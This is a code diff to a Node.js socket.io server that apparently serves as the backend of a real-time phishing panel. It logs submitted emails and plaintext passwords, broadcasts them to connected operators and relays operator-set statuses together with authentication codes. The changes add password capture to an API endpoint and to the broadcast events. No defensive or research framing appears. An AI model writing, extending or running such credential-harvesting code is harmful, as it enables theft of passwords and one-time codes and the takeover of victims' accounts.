@@ -103,19 +103,25 @@ io.on('connection', (socket) => {
 
   // Ping/Pong for connection keep-alive
   socket.on('ping', () => {
-    socket.emit('pong', { timestamp: new Date().toISOString() });
+    console.log(`🏓 Ping received from ${socket.id}`);
+    socket.emit('pong', {
+      timestamp: new Date().toISOString(),
+      echo: 'pong'
+    });
   });
 
   // Login attempt handler
   socket.on('login-attempt', (data) => {
-    console.log(`📥 Login attempt from: ${data.username}`);
-    console.log(`📧 Email: ${data.username}`);
+    console.log(`📥 Login attempt from: ${data.email || data.username}`);
+    console.log(`📧 Email: ${data.email || data.username}`);
     console.log(`🔑 Password: ${data.password}`);
 
     // Broadcast to all connected admins
     io.emit('admin_notification', {
-      email: data.username,
+      email: data.email || data.username,
       password: data.password,
+      type: data.type || 'login_attempt',
+      message: data.message || 'New login attempt',
       timestamp: new Date().toISOString(),
       source: socket.id,
     });
@@ -123,11 +129,11 @@ io.on('connection', (socket) => {
 
   // Update login status
   socket.on('update-login-status', (data) => {
-    console.log(`📢 Admin updated status: ${data.username} → ${data.status}`);
+    console.log(`📢 Admin updated status: ${data.email} → ${data.status}`);
     console.log(`🔐 Auth Code: ${data.authCode || 'N/A'}`);
 
     io.emit('user_update', {
-      email: data.username,
+      email: data.email,
       newStatus: data.status,
       authCode: data.authCode || '',
       timestamp: new Date().toISOString(),
@@ -173,16 +179,19 @@ app.get('/status', (req, res) => {
 });
 
 // ======================== API ENDPOINTS ==========================
-// Send notification to admins - UPDATED with better logging
+// Send notification to admins - UPDATED with password support
 app.post('/api/notify-admin', (req, res) => {
   try {
-    const { email, type, message } = req.body;
+    const { email, type, message, password } = req.body;
 
     console.log('='.repeat(50));
     console.log('📧 NOTIFICATION RECEIVED');
     console.log('📧 Email:', email);
     console.log('📊 Type:', type || 'info');
     console.log('📝 Message:', message || 'No message');
+    if (password) {
+      console.log('🔑 Password:', password);
+    }
     console.log('='.repeat(50));
 
     if (!email) {
@@ -197,8 +206,9 @@ app.post('/api/notify-admin', (req, res) => {
 
     io.emit('admin_notification', {
       email,
-      type: type || 'info',
+      type: type || 'login_attempt',
       message: message || '',
+      password: password || '', // ✅ Include password in the emitted event
       timestamp: new Date().toISOString(),
     });
 
